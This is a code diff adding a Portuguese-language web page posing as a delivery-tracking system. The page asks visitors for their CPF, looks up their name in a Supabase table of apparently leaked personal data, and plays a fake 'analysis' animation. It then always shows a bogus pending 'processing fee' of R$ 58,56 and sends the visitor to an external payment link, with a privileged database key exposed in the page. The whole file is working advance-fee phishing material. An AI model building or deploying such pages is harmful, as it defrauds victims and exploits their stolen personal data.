@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sistema de Entrega</title>
+  <meta name="description" content="Verifique e desbloqueie seus recebimentos pendentes">
+  
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <!-- Supabase JS CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            primary: {
+              DEFAULT: '#FFC107', // Cor principal amarela
+              light: '#FFD54F',   // Amarelo mais claro
+              lighter: '#FFECB3', // Amarelo ainda mais claro
+              dark: '#FFA000',    // Amarelo mais escuro
+              darker: '#FF8F00'   // Amarelo ainda mais escuro
+            },
+            secondary: {
+              DEFAULT: '#333333', // Cor secundária escura para textos
+              light: '#666666',
+              lighter: '#999999'
+            }
+          },
+          animation: {
+            'fade-in': 'fadeIn 0.5s ease-out forwards',
+            'slide-up': 'slideUp 0.6s ease-out forwards',
+            'progress-bar': 'progressBar 6s ease-out forwards',
+            'spin-slow': 'spin 3s linear infinite',
+            'pulse-warning': 'pulseWarning 2s infinite'
+          },
+          keyframes: {
+            fadeIn: {
+              '0%': { opacity: '0', transform: 'translateY(10px)' },
+              '100%': { opacity: '1', transform: 'translateY(0)' }
+            },
+            slideUp: {
+              '0%': { opacity: '0', transform: 'translateY(20px)' },
+              '100%': { opacity: '1', transform: 'translateY(0)' }
+            },
+            progressBar: {
+              '0%': { width: '0%' },
+              '100%': { width: '100%' }
+            },
+            pulseWarning: {
+              '0%, 100%': { opacity: 1 },
+              '50%': { opacity: 0.7 }
+            }
+          }
+        }
+      }
+    }
+  </script>
+
+  <!-- Inline CSS for elements not easily styled with Tailwind -->
+  <style>
+    .delay-100 { animation-delay: 100ms; }
+    .delay-200 { animation-delay: 200ms; }
+    .delay-300 { animation-delay: 300ms; }
+    .delay-400 { animation-delay: 400ms; }
+    
+    .opacity-0 { opacity: 0; }
+    
+    .animate-fade-in {
+      animation: fadeIn 0.5s ease-out forwards;
+    }
+    
+    .animate-slide-up {
+      animation: slideUp 0.6s ease-out forwards;
+    }
+    
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: translateY(10px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes slideUp {
+      0% { opacity: 0; transform: translateY(20px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes progressBar {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    @keyframes pulseWarning {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.7; }
+    }
+    
+    /* Estilo para botão desabilitado mas visível */
+    .btn-disabled-visible {
+      background-color: #999999;
+      color: white;
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+    
+    /* Estilos para cards com aparência mais profissional */
+    .card-professional {
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
+      border-radius: 12px;
+      backdrop-filter: blur(5px);
+    }
+    
+    /* Faixa amarela no topo */
+    .yellow-banner {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 10px;
+      background-color: #FFC107;
+      z-index: 1000;
+    }
+    
+    /* Efeito de pulsação para alertas */
+    .pulse-warning {
+      animation: pulseWarning 2s infinite;
+    }
+  </style>
+</head>
+
+<body class="min-h-screen flex flex-col items-center justify-center bg-white p-4 pt-12">
+  <!-- Faixa amarela no topo -->
+  <div class="yellow-banner"></div>
+  
+  <div class="w-full max-w-md mb-8">
+    <!-- Logo e Título -->
+    <div class="text-center mb-8">
+      <h1 class="text-4xl font-bold text-secondary-DEFAULT mb-2 animate-fade-in">
+        Sistema de Entrega
+      </h1>
+      <p class="text-secondary-light animate-fade-in delay-200 text-lg">
+        Verifique seus pedidos e confira o status deles
+      </p>
+    </div>
+
+    <!-- CPF Form -->
+    <div id="cpf-form" class="block">
+      <div class="w-full max-w-md mx-auto bg-white border border-gray-200 rounded-xl shadow-xl animate-fade-in card-professional">
+        <div class="space-y-2 text-center p-8 border-b border-gray-100">
+          <h2 class="text-2xl font-bold tracking-tight text-secondary-DEFAULT">Consulta de Recebimento</h2>
+          <p class="text-gray-700">
+            Insira seu CPF para verificar o status do seu recebimento
+          </p>
+        </div>
+        <div class="px-8 py-6">
+          <div class="space-y-5">
+            <div class="space-y-2">
+              <label for="cpf-input" class="block text-sm font-medium text-gray-700 mb-1">CPF:</label>
+              <input
+                type="text"
+                id="cpf-input"
+                placeholder="000.000.000-00"
+                class="text-center text-lg py-5 w-full rounded-lg border-2 border-gray-300 focus:border-primary-DEFAULT focus:outline-none shadow-sm"
+                maxlength="14"
+              />
+              <p id="error-message" class="text-red-500 text-sm mt-2 hidden"></p>
+            </div>
+            <button
+              id="submit-button"
+              class="w-full py-5 btn-disabled-visible rounded-lg transition-all duration-300 flex items-center justify-center shadow-md text-lg font-medium"
+              disabled
+            >
+              <span class="flex items-center">
+                Consultar 
+                <svg xmlns="http://www.w3.org/2000/svg" class="ml-2 h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M5 12h14"></path>
+                  <path d="m12 5 7 7-7 7"></path>
+                </svg>
+              </span>
+            </button>
+          </div>
+        </div>
+        <div class="flex justify-center items-center text-sm text-gray-600 p-6 pt-2 gap-2">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-primary-DEFAULT" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+          Seus dados estão protegidos e seguros
+        </div>
+      </div>
+    </div>
+
+    <!-- Analysis Screen -->
+    <div id="analysis-screen" class="hidden">
+      <div class="w-full max-w-md mx-auto bg-white border border-gray-200 rounded-xl shadow-xl animate-fade-in card-professional">
+        <div class="text-center p-8 border-b border-gray-100">
+          <h2 class="text-2xl font-bold tracking-tight text-secondary-DEFAULT">Analisando seu CPF</h2>
+          <p id="welcome-message-analysis" class="text-gray-700 mt-2">
+            Por favor, aguarde enquanto processamos sua solicitação
+          </p>
+        </div>
+        <div class="p-8 pt-6 space-y-6">
+          <div class="relative pt-1">
+            <div class="flex mb-2 items-center justify-between">
+              <div>
+                <span class="text-xs font-semibold inline-block py-1 px-2 uppercase rounded-full text-primary-dark bg-primary-lighter">
+                  Em progresso
+                </span>
+              </div>
+              <div class="text-right">
+                <span id="progress-percentage" class="text-xs font-semibold inline-block text-secondary-DEFAULT">
+                  0%
+                </span>
+              </div>
+            </div>
+            <div class="w-full bg-gray-200 h-3 rounded-full overflow-hidden mb-2">
+              <div id="progress-bar" class="bg-primary-DEFAULT h-full" style="width: 0%"></div>
+            </div>
+          </div>
+          
+          <div class="space-y-4">
+            <!-- Analysis Steps -->
+            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in shadow bg-white hover:bg-primary-lighter/30 transition-colors duration-300" id="step-1">
+              <div class="flex-shrink-0" id="step-1-icon">
+                <div class="w-10 h-10 rounded-full border-2 border-primary-dark/30 flex items-center justify-center bg-white shadow-sm">
+                  <span class="text-primary-dark font-medium">1</span>
+                </div>
+              </div>
+              <div class="flex-1">
+                <h3 class="text-base font-medium text-gray-800">Validação de CPF</h3>
+                <p class="text-sm text-gray-600">Verificando a autenticidade do documento informado</p>
+              </div>
+            </div>
+
+            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in delay-100 shadow bg-white hover:bg-primary-lighter/30 transition-colors duration-300" id="step-2">
+              <div class="flex-shrink-0" id="step-2-icon">
+                <div class="w-10 h-10 rounded-full border-2 border-primary-dark/30 flex items-center justify-center bg-white shadow-sm">
+                  <span class="text-primary-dark font-medium">2</span>
+                </div>
+              </div>
+              <div class="flex-1">
+                <h3 class="text-base font-medium text-gray-800">Consulta de Dados</h3>
+                <p class="text-sm text-gray-600">Buscando informações associadas ao CPF</p>
+              </div>
+            </div>
+
+            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in delay-200 shadow bg-white hover:bg-primary-lighter/30 transition-colors duration-300" id="step-3">
+              <div class="flex-shrink-0" id="step-3-icon">
+                <div class="w-10 h-10 rounded-full border-2 border-primary-dark/30 flex items-center justify-center bg-white shadow-sm">
+                  <span class="text-primary-dark font-medium">3</span>
+                </div>
+              </div>
+              <div class="flex-1">
+                <h3 class="text-base font-medium text-gray-800">Verificação de Recebimentos</h3>
+                <p class="text-sm text-gray-600">Checando recebimentos disponíveis no sistema</p>
+              </div>
+            </div>
+
+            <div class="flex items-center gap-4 p-5 rounded-lg border border-gray-100 opacity-0 animate-fade-in delay-300 shadow bg-white hover:bg-primary-lighter/30 transition-colors duration-300" id="step-4">
+              <div class="flex-shrink-0" id="step-4-icon">
+                <div class="w-10 h-10 rounded-full border-2 border-primary-dark/30 flex items-center justify-center bg-white shadow-sm">
+                  <span class="text-primary-dark font-medium">4</span>
+                </div>
+              </div>
+              <div class="flex-1">
+                <h3 class="text-base font-medium text-gray-800">Análise de Pendências</h3>
+                <p class="text-sm text-gray-600">Verificando pendências no processamento do pedido</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Result Screen -->
+    <div id="result-screen" class="hidden">
+      <div class="w-full max-w-md mx-auto bg-white border border-gray-200 rounded-xl shadow-xl animate-slide-up card-professional">
+        <div class="space-y-4 text-center p-8 border-b border-gray-100">
+          <div class="mx-auto bg-yellow-100 p-4 rounded-full w-20 h-20 flex items-center justify-center shadow-md">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-yellow-600 pulse-warning" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"></circle>
+              <line x1="12" y1="8" x2="12" y2="12"></line>
+              <line x1="12" y1="16" x2="12.01" y2="16"></line>
+            </svg>
+          </div>
+          <h2 class="text-2xl font-bold tracking-tight text-secondary-DEFAULT">Pagamento com Pendência</h2>
+        </div>
+        <div class="p-8 pt-6 space-y-6">
+          <div class="bg-yellow-50 rounded-lg p-5 border border-yellow-200 shadow-sm">
+            <h3 class="font-medium text-lg mb-2 text-secondary-DEFAULT">Olá, <span id="nome-cliente">Cliente</span>!</h3>
+            <p class="text-gray-700">
+              Identificamos que seu pagamento foi concluído, porém existe uma <span class="font-semibold text-yellow-700">pendência</span> com o seu pedido que precisa ser regularizada para continuarmos o processamento.
+            </p>
+          </div>
+          
+          <div class="space-y-4 border-t border-b py-6">
+            <div class="flex justify-between items-center">
+              <span class="text-gray-600">Pagamento realizado:</span>
+              <span class="font-medium">Sim</span>
+            </div>
+            <div class="flex justify-between items-center">
+              <span class="text-gray-600">Status atual:</span>
+              <span class="bg-yellow-100 text-yellow-700 font-medium px-3 py-1 rounded-full text-sm shadow-sm pulse-warning">Pendente</span>
+            </div>
+            <div class="flex justify-between items-center">
+              <span class="text-gray-600">Pendência:</span>
+              <span id="nome-tarifa" class="font-medium">Taxa de processamento</span>
+            </div>
+            <div class="flex justify-between items-center">
+              <span class="text-gray-600">Valor a pagar:</span>
+              <span id="valor-tarifa" class="font-bold text-secondary-DEFAULT text-lg">R$ 58,56</span>
+            </div>
+          </div>
+          
+          <div class="bg-yellow-50 p-4 rounded-lg border border-yellow-200">
+            <p class="text-sm text-yellow-800">
+              <span class="font-medium">Importante:</span> É necessário regularizar esta pendência para que seu pedido possa ser processado corretamente.
+            </p>
+          </div>
+        </div>
+        <div class="px-8 pb-8">
+          <button 
+            id="proceed-button"
+            class="w-full py-5 bg-primary-dark text-white rounded-lg transition-all duration-300 flex items-center justify-center shadow-lg text-lg font-medium relative overflow-hidden group"
+          >
+            <span class="absolute w-64 h-64 mt-12 bg-primary-light opacity-30 rotate-45 -translate-x-40 -translate-y-32 transform transition duration-1000 group-hover:translate-x-10 group-hover:-translate-y-24"></span>
+            <span class="flex items-center relative z-10">
+              Pagar taxa e regularizar pendência
+              <svg xmlns="http://www.w3.org/2000/svg" class="ml-2 h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 12h14"></path>
+                <path d="m12 5 7 7-7 7"></path>
+              </svg>
+            </span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="w-full max-w-md text-center text-sm text-gray-500 mt-8 animate-fade-in delay-400">
+    <p>&copy; <span id="current-year"></span> Sistema Financeiro. Todos os direitos reservados.</p>
+  </footer>
+
+  <script>
+    // Configuração do Supabase
+    const supabaseUrl = 'https://bewgphogfsnwhjfizosn.supabase.co';
+    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJld2dwaG9nZnNud2hqZml6b3NuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NDczMTYwMSwiZXhwIjoyMDYwMzA3NjAxfQ.RWHtKgFb28I8t2YM5UPpdYhYHmmr48M3cJKZpmNAy9M';
+    const supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
+    
+    // Links de pagamentos constantes
+    const linkPagamento = "https://pay.pagamentos-online.org/xQBPZvR0DQBZmVq?src=email";
+    
+    // Format CPF input (XXX.XXX.XXX-XX)
+    function formatCPF(cpf) {
+      // Remove non-digit characters
+      const cleanedCPF = cpf.replace(/\D/g, '');
+      
+      // Apply CPF formatting
+      if (cleanedCPF.length <= 3) {
+        return cleanedCPF;
+      } else if (cleanedCPF.length <= 6) {
+        return `${cleanedCPF.slice(0, 3)}.${cleanedCPF.slice(3)}`;
+      } else if (cleanedCPF.length <= 9) {
+        return `${cleanedCPF.slice(0, 3)}.${cleanedCPF.slice(3, 6)}.${cleanedCPF.slice(6)}`;
+      } else {
+        return `${cleanedCPF.slice(0, 3)}.${cleanedCPF.slice(3, 6)}.${cleanedCPF.slice(6, 9)}-${cleanedCPF.slice(9, 11)}`;
+      }
+    }
+
+    // Validate CPF (simplified validation)
+    function validateCPF(cpf) {
+      const cleanedCPF = cpf.replace(/\D/g, '');
+      
+      // CPF must have 11 digits
+      if (cleanedCPF.length !== 11) return false;
+      
+      // Check if all digits are the same (invalid)
+      if (/^(\d)\1+$/.test(cleanedCPF)) return false;
+      
+      // For this application, we're just checking if it has 11 digits
+      return true;
+    }
+
+    // Função para buscar cliente pelo CPF
+    async function buscarClientePorCPF(cpf) {
+      try {
+        // Limpar formatação do CPF
+        const cpfLimpo = cpf.replace(/\D/g, '');
+        
+        console.log('Buscando cliente com CPF:', cpfLimpo);
+        
+        try {
+          const { data, error } = await supabaseClient
+            .from('vitor leite')
+            .select('nome')
+            .eq('cpf', cpfLimpo)
+            .single();
+          
+          if (error) {
+            console.log('Erro ao buscar cliente no Supabase:', error);
+            return null;
+          }
+          
+          console.log('Cliente encontrado no Supabase:', data);
+          return data?.nome || null;
+        } catch (supabaseError) {
+          console.error('Erro de conexão com Supabase:', supabaseError);
+          return null;
+        }
+      } catch (error) {
+        console.error('Erro geral ao buscar cliente:', error);
+        return null;
+      }
+    }
+
+    // Set current year in footer
+    document.getElementById('current-year').textContent = new Date().getFullYear();
+
+    // Get DOM elements
+    const cpfForm = document.getElementById('cpf-form');
+    const analysisScreen = document.getElementById('analysis-screen');
+    const resultScreen = document.getElementById('result-screen');
+    const cpfInput = document.getElementById('cpf-input');
+    const submitButton = document.getElementById('submit-button');
+    const errorMessage = document.getElementById('error-message');
+    const proceedButton = document.getElementById('proceed-button');
+    const progressBar = document.getElementById('progress-bar');
+
+    // Handle CPF input changes
+    cpfInput.addEventListener('input', function(e) {
+      const formattedCPF = formatCPF(e.target.value);
+      e.target.value = formattedCPF;
+      errorMessage.classList.add('hidden');
+      
+      // Enable/disable submit button based on CPF length
+      if (formattedCPF.length === 14) {
+        submitButton.disabled = false;
+        submitButton.classList.remove('btn-disabled-visible');
+        submitButton.classList.add('bg-primary-DEFAULT');
+      } else {
+        submitButton.disabled = true;
+        submitButton.classList.remove('bg-primary-DEFAULT');
+        submitButton.classList.add('btn-disabled-visible');
+      }
+    });
+
+    // Handle form submission
+    submitButton.addEventListener('click', async function() {
+      const cleanedCPF = cpfInput.value.replace(/\D/g, '');
+      
+      if (!validateCPF(cleanedCPF)) {
+        errorMessage.textContent = 'Por favor, insira um CPF válido.';
+        errorMessage.classList.remove('hidden');
+        return;
+      }
+      
+      // Show loading animation on button
+      submitButton.innerHTML = `
+        <span class="flex items-center justify-center">
+          <span class="mr-2">Processando</span>
+          <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+          </svg>
+        </span>
+      `;
+      submitButton.disabled = true;
+      
+      // Tentar buscar o nome do cliente
+      let nomeCliente = 'Cliente';
+      try {
+        // Buscar nome do cliente no Supabase
+        const result = await buscarClientePorCPF(cpfInput.value);
+        console.log('Resultado da busca:', result);
+        
+        if (result) {
+          nomeCliente = result;
+        }
+      } catch (error) {
+        console.error('Erro ao processar cliente:', error);
+      }
+      
+      // Armazenar o nome do cliente para uso posterior
+      window.clienteNome = nomeCliente;
+      
+      // Atualizar mensagem de boas-vindas na tela de análise
+      const welcomeMessageAnalysis = document.getElementById('welcome-message-analysis');
+      if (welcomeMessageAnalysis) {
+        welcomeMessageAnalysis.innerHTML = `Olá, <span class="font-medium">${nomeCliente}</span>! Por favor, aguarde enquanto processamos sua solicitação`;
+      }
+      
+      // Atualizar nome na tela de resultado
+      const nomeClienteElement = document.getElementById('nome-cliente');
+      if (nomeClienteElement) {
+        nomeClienteElement.textContent = nomeCliente;
+      }
+      
+      // Definir taxa fixa no valor especificado
+      document.getElementById('valor-tarifa').textContent = 'R$ 58,56';
+      
+      // Transition to analysis screen after short delay
+      setTimeout(() => {
+        cpfForm.classList.add('hidden');
+        analysisScreen.classList.remove('hidden');
+        startAnalysis();
+      }, 1000);
+    });
+
+    // Analysis step animation
+    function startAnalysis() {
+      // Animate progress bar
+      progressBar.style.animation = 'progressBar 6s ease-out forwards';
+      
+      const steps = [
+        { id: 'step-1', delay: 1000, percent: 25 },
+        { id: 'step-2', delay: 2500, percent: 50 },
+        { id: 'step-3', delay: 4000, percent: 75 },
+        { id: 'step-4', delay: 5500, percent: 100 }
+      ];
+      
+      // Get progress percentage element
+      const progressPercentage = document.getElementById('progress-percentage');
+      
+      steps.forEach((step, index) => {
+        setTimeout(() => {
+          // Update progress percentage
+          progressPercentage.textContent = `${step.percent}%`;
+          
+          // Update current step to "processing"
+          const stepElement = document.getElementById(step.id);
+          const iconContainer = document.getElementById(`${step.id}-icon`);
+          
+          // Highlight current step
+          stepElement.classList.add('bg-primary-lighter/30', 'border-l-2', 'border-primary-dark');
+          
+          iconContainer.innerHTML = `
+            <div class="w-10 h-10 rounded-full flex items-center justify-center bg-primary-lighter shadow">
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-primary-dark animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="12" y1="2" x2="12" y2="6"></line>
+                <line x1="12" y1="18" x2="12" y2="22"></line>
+                <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"></line>
+                <line x1="16.24" y1="16.24" x2="19.07" y2="19.07"></line>
+                <line x1="2" y1="12" x2="6" y2="12"></line>
+                <line x1="18" y1="12" x2="22" y2="12"></line>
+                <line x1="4.93" y1="19.07" x2="7.76" y2="16.24"></line>
+                <line x1="16.24" y1="7.76" x2="19.07" y2="4.93"></line>
+              </svg>
+            </div>
+          `;
+          
+          // Mark previous steps as completed
+          if (index > 0) {
+            const prevStepId = steps[index - 1].id;
+            const prevStepElement = document.getElementById(prevStepId);
+            const prevStepIcon = document.getElementById(`${prevStepId}-icon`);
+            
+            prevStepElement.classList.remove('bg-primary-lighter/30', 'border-l-2', 'border-primary-dark');
+            prevStepElement.classList.add('bg-primary-lighter/50', 'border-l-4', 'border-primary-DEFAULT');
+            
+            prevStepIcon.innerHTML = `
+              <div class="w-10 h-10 rounded-full flex items-center justify-center bg-primary-DEFAULT shadow">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M20 6L9 17l-5-5"></path>
+                </svg>
+              </div>
+            `;
+          }
+          
+          // For the last step, make it show a warning icon instead of completed
+          if (index === steps.length - 1) {
+            setTimeout(() => {
+              // Change the last step to show a warning
+              const lastStepElement = document.getElementById(step.id);
+              const lastStepIcon = document.getElementById(`${step.id}-icon`);
+              
+              lastStepElement.classList.remove('bg-primary-lighter/30', 'border-l-2', 'border-primary-dark');
+              lastStepElement.classList.add('bg-yellow-50', 'border-l-4', 'border-yellow-500');
+              
+              lastStepIcon.innerHTML = `
+                <div class="w-10 h-10 rounded-full flex items-center justify-center bg-yellow-500 shadow pulse-warning">
+                  <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="8" x2="12" y2="12"></line>
+                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                  </svg>
+                </div>
+              `;
+              
+              // Transition to result screen
+              setTimeout(() => {
+                analysisScreen.classList.add('hidden');
+                resultScreen.classList.remove('hidden');
+              }, 1000);
+            }, 1000);
+          }
+        }, step.delay);
+      });
+    }
+    
+    // Handle proceed button click
+    proceedButton.addEventListener('click', function() {
+      window.location.href = linkPagamento;
+    });
+  </script>
+</body>
+</html>
